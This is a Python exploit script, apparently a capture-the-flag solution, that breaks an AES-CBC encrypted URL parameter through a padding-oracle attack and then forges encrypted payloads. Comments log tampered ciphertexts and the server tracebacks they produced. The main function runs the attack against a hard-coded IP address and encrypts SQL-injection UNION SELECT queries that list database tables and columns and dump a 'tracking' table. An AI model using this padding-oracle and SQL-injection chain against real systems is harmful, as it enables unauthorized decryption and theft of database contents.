import asyncio
import json
import padding_oracle

# Changed first character
# TZwZ!OMOzsiMCByQG!fIE09cXK1F67DPhBg3t5xC0wgMB5liEdY3HuGEvcbgssrA3hElthX4rjIEqpGlRoBxvMLC99AQHGCRE4HDN-01b!twXp44Hre3KprxSTNOFkaKF!qPUyV!DFH8kEfu5v-g5lPG5BY9m1tVINnArc5mlJkpXQcjJN81SKAdmLyw5gqo!1b0PCtW6aCeeeogKz1oSw~~
#
# Traceback (most recent call last):
#   File "./main.py", line 69, in index
#     post = json.loads(decryptLink(postCt).decode('utf8'))
#   File "/usr/local/lib/python2.7/json/__init__.py", line 339, in loads
#     return _default_decoder.decode(s)
#   File "/usr/local/lib/python2.7/json/decoder.py", line 364, in decode
#     obj, end = self.raw_decode(s, idx=_w(s, 0).end())
#   File "/usr/local/lib/python2.7/json/decoder.py", line 382, in raw_decode
#     raise ValueError("No JSON object could be decoded")
# ValueError: No JSON object could be decoded

# Add a leading character 'a'
# aSZwZ!OMOzsiMCByQG!fIE09cXK1F67DPhBg3t5xC0wgMB5liEdY3HuGEvcbgssrA3hElthX4rjIEqpGlRoBxvMLC99AQHGCRE4HDN-01b!twXp44Hre3KprxSTNOFkaKF!qPUyV!DFH8kEfu5v-g5lPG5BY9m1tVINnArc5mlJkpXQcjJN81SKAdmLyw5gqo!1b0PCtW6aCeeeogKz1oSw~~
#
#   File "./main.py", line 69, in index
#     post = json.loads(decryptLink(postCt).decode('utf8'))
#   File "./common.py", line 49, in decryptLink
#     return unpad(cipher.decrypt(data))
#   File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
#     return self._cipher.decrypt(ciphertext)
# ValueError: Input strings must be a multiple of 16 in length

# Remove first character
# ZwZ!OMOzsiMCByQG!fIE09cXK1F67DPhBg3t5xC0wgMB5liEdY3HuGEvcbgssrA3hElthX4rjIEqpGlRoBxvMLC99AQHGCRE4HDN-01b!twXp44Hre3KprxSTNOFkaKF!qPUyV!DFH8kEfu5v-g5lPG5BY9m1tVINnArc5mlJkpXQcjJN81SKAdmLyw5gqo!1b0PCtW6aCeeeogKz1oSw~~
#
#   File "./main.py", line 69, in index
#     post = json.loads(decryptLink(postCt).decode('utf8'))
#   File "./common.py", line 46, in decryptLink
#     data = b64d(data)
#   File "./common.py", line 11, in <lambda>
#     b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
#   File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
#     return binascii.a2b_base64(s)
# Error: Incorrect padding

# EMPTY or too short
# IV seems to be concatenate in the first part 
#
#   File "./main.py", line 69, in index
#     post = json.loads(decryptLink(postCt).decode('utf8'))
#   File "./common.py", line 48, in decryptLink
#     cipher = AES.new(staticKey, AES.MODE_CBC, iv)
#   File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
#     return AESCipher(key, *args, **kwargs)
#   File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
#     blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
#   File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
#     self._cipher = factory.new(key, *args, **kwargs)
# ValueError: IV must be 16 bytes long

# Modify last character before ~~
# SZwZ!OMOzsiMCByQG!fIE09cXK1F67DPhBg3t5xC0wgMB5liEdY3HuGEvcbgssrA3hElthX4rjIEqpGlRoBxvMLC99AQHGCRE4HDN-01b!twXp44Hre3KprxSTNOFkaKF!qPUyV!DFH8kEfu5v-g5lPG5BY9m1tVINnArc5mlJkpXQcjJN81SKAdmLyw5gqo!1b0PCtW6aCeeeogKz1oSa~~ 
#
# Traceback (most recent call last):
#   File "./main.py", line 69, in index
#     post = json.loads(decryptLink(postCt).decode('utf8'))
#   File "./common.py", line 49, in decryptLink
#     return unpad(cipher.decrypt(data))
#   File "./common.py", line 22, in unpad
#     raise PaddingException()
# PaddingException

# NclPFnkulzmiK1omMv5TyLEsq0hEPA67L5uQbVuWpzi-Ysp1MK3p78E68LJHLDIgzGXCP0Mahb-SlEwjpGrdtrMb40UT-1!S6ZT3t94g6WT!M!EN0g5uWZr4tYXdZXTezCgHYaczhRF4Cv7giNLEAravEY5SoX!2NxWYDQZCgKFWUWcddfSYD5Z1oWK6q6KLnxAzShmui-izucKgbo2t1w~~
#
#   File "./main.py", line 72, in index
#     abort(404)
#   File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 707, in abort
#     return _aborter(status, *args, **kwargs)
#   File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 687, in __call__
#     raise self.mapping[code](*args, **kwargs)
# NotFound: 404 Not Found: The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.

async def main():

    data = 'IGlzgX40p1c8lLE1UpQBqGUIlDp4eZW0-ZyRyI6-8d8vfaDCK!MTqRmM9Yty324gb016BJaMRAxB23EqZvtWxeDlglrV-IjIjrlELNSiTN6Z1A3bvNz48-4pBzT5oNPjAyODDZx6qffjlAEB9bQXE2CeQnWPnOI9ca2DR5t03uRI7pjbjbh22lON8HVctpCyslHPDIYI-jOEKYIsshSE1A~~'
    # data = 'IGl8iT1ppU8tjYxRY!Vm92UIlDp4eZW0-ZyRyI6-8d8~'
    
    data_bytes = bytearray(padding_oracle.b64d(data))

    padding_oracle.print_data_hex(data_bytes)
    print(padding_oracle.b64e(data_bytes))

    await padding_oracle.attack("http://35.227.24.107/3aaba1e0ae/?post=", data_bytes, 16)
    
    query = '{"id": "1"}'
    await padding_oracle.cipher_string("http://35.227.24.107/3aaba1e0ae/?post=", query, 16)

    query = '{"id": "0 UNION SELECT (SELECT group_concat(TABLE_NAME separator \', \') FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN (\'performance_schema\', \'information_schema\', \'mysql\')), \'totot\' -- "}'
    query = '{"id": "0 UNION SELECT (SELECT group_concat(COLUMN_NAME separator \', \') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = \'tracking\'), \'totot\' -- "}'
    query = '{"id": "0 UNION SELECT (SELECT group_concat(headers separator \', \') FROM tracking), \'totot\' -- "}'
    print(json.loads(query))

    await padding_oracle.cipher_string("http://35.227.24.107/3aaba1e0ae/?post=", query, 16)

asyncio.run(main())
exit()